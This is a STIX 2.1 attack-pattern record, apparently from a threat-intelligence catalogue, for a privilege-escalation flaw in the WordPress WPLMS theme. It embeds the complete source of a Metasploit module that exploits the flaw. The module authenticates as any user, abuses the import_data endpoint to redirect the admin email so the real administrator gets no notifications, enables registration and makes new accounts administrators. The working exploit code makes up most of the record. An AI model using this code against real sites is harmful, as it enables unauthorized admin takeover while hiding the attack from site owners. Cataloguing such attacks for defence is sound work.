{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dc9ba817-6d03-4d87-a3ad-b0bfcc6a39c5",
    "created": "2024-08-14T16:23:43.751209Z",
    "modified": "2024-08-14T16:23:43.751213Z",
    "name": "WordPress WPLMS Theme Privilege Escalation",
    "description": " The WordPress WPLMS theme from version 1.5.2 to 1.8.4.1 allows an authenticated user of any user level to set any system option due to a lack of validation in the import_data function of /includes/func.php.  The module first changes the admin e-mail address to prevent any notifications being sent to the actual administrator during the attack re-enables user registration in case it has been disabled and sets the default role to be administrator.  This will allow for the user to create a new account with admin privileges via the default registration page found at /wp-login.php?action=register. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/wp_wplms_privilege_escalation.rb",
            "external_id": "wp_wplms_privilege_escalation.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7785"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress WPLMS Theme Privilege Escalation',\n        'Description' => %q{\n          The WordPress WPLMS theme from version 1.5.2 to 1.8.4.1 allows an\n          authenticated user of any user level to set any system option due to a lack of\n          validation in the import_data function of /includes/func.php.\n\n          The module first changes the admin e-mail address to prevent any\n          notifications being sent to the actual administrator during the attack,\n          re-enables user registration in case it has been disabled and sets the default\n          role to be administrator.  This will allow for the user to create a new account\n          with admin privileges via the default registration page found at\n          /wp-login.php?action=register.\n        },\n        'Author' => [\n          'Evex', # Vulnerability discovery\n          'rastating' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['WPVDB', '7785']\n        ],\n        'DisclosureDate' => '2015-02-09'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),\n        OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])\n      ]\n    )\n  end\n\n  def check\n    check_theme_version_from_readme('wplms', '1.8.4.2', '1.5.2')\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def php_serialize(value)\n    # Only strings and numbers are required by this module\n    case value\n    when String, Symbol\n      \"s:#{value.bytesize}:\\\"#{value}\\\";\"\n    when Integer\n      \"i:#{value};\"\n    end\n  end\n\n  def serialize_and_encode(value)\n    serialized_value = php_serialize(value)\n    unless serialized_value.nil?\n      Rex::Text.encode_base64(serialized_value)\n    end\n  end\n\n  def set_wp_option(name, value, cookie)\n    encoded_value = serialize_and_encode(value)\n    if encoded_value.nil?\n      vprint_error(\"Failed to serialize #{value}.\")\n    else\n      res = send_request_cgi(\n        'method' => 'POST',\n        'uri' => wordpress_url_admin_ajax,\n        'vars_get' => { 'action' => 'import_data' },\n        'vars_post' => { 'name' => name, 'code' => encoded_value },\n        'cookie' => cookie\n      )\n\n      if res.nil?\n        vprint_error('No response from the target.')\n      elsif res.code != 200\n        vprint_warning(\"Server responded with status code #{res.code}\")\n      end\n\n      return res\n    end\n  end\n\n  def run\n    print_status(\"Authenticating with WordPress using #{username}:#{password}...\")\n    cookie = wordpress_login(username, password)\n    fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress') if cookie.nil?\n    store_valid_credential(user: username, private: password, proof: cookie)\n    print_good('Authenticated with WordPress')\n\n    new_email = \"#{Rex::Text.rand_text_alpha(5)}@#{Rex::Text.rand_text_alpha(5)}.com\"\n    print_status(\"Changing admin e-mail address to #{new_email}...\")\n    if set_wp_option('admin_email', new_email, cookie).nil?\n      fail_with(Failure::UnexpectedReply, 'Failed to change the admin e-mail address')\n    end\n\n    print_status('Enabling user registrations...')\n    if set_wp_option('users_can_register', 1, cookie).nil?\n      fail_with(Failure::UnexpectedReply, 'Failed to enable user registrations')\n    end\n\n    print_status('Setting the default user role...')\n    if set_wp_option('default_role', 'administrator', cookie).nil?\n      fail_with(Failure::UnexpectedReply, 'Failed to set the default user role')\n    end\n\n    register_url = normalize_uri(target_uri.path, 'wp-login.php?action=register')\n    print_good('Privilege escalation complete')\n    print_good(\"Create a new account at #{register_url} to gain admin access.\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-09"
}